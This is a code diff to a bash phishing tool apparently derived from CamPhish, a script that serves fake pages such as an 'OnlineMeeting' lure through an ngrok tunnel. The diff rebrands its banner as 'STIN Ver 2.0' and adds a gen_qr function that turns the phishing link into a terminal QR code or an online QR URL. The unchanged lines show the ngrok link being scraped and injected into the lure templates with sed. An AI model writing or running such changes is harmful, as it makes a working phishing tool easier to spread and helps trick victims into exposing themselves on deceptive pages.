@@ -30,20 +30,18 @@ trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 2.0 \e[0m \n"
+printf "\e[1;92m  _______ _________ \e[0m\e[1;77m_______  _       \e[0m\n"
+printf "\e[1;92m (  ____ \\\\__   __/\e[0m\e[1;77m(  ___  )( (    /|\e[0m\n"
+printf "\e[1;92m | (    \/   ) (   \e[0m\e[1;77m| (   ) ||  \  ( |\e[0m\n"
+printf "\e[1;92m | (_____    | |   \e[0m\e[1;77m| |   | ||   \ | |\e[0m\n"
+printf "\e[1;92m (_____  )   | |   \e[0m\e[1;77m| |   | || (\ \) |\e[0m\n"
+printf "\e[1;92m       ) |   | |   \e[0m\e[1;77m| |   | || | \   |\e[0m\n"
+printf "\e[1;92m /\____) |   | |   \e[0m\e[1;77m| (___) || )  \  |\e[0m\n"
+printf "\e[1;92m \_______)   )_(   \e[0m\e[1;77m(_______)|/    )_)\e[0m\n"
+printf " \e[1;93m STIN Ver 2.0 \e[0m \n"
 printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
 printf "\n"
-
-
 }
 
 dependencies() {
@@ -302,6 +300,7 @@ else
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
+gen_qr "$link"
 }
 
 ngrok_server() {
@@ -445,6 +444,17 @@ payload_ngrok
 checkfound
 }
 
+
+gen_qr() {
+    if command -v qrencode > /dev/null 2>&1; then
+        printf "\n\e[1;92m[\e[0m+\e[1;92m] Generating QR Code for: $1\e[0m\n"
+        qrencode -t ANSIUTF8 "$1"
+    else
+        printf "\n\e[1;93m[\e[0m!\e[1;93m] qrencode not found. Install it for QR support (sudo apt install qrencode)\e[0m\n"
+        printf "\e[1;93m[\e[0m!\e[1;93m] Or generate online: https://qrenco.de/$1\e[0m\n"
+    fi
+}
+
 payload_ngrok() {
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 sed 's+forwarding_link+'$link'+g' template.php > index.php
@@ -458,6 +468,7 @@ else
 sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
+gen_qr "$link"
 }
 
 camphish() {
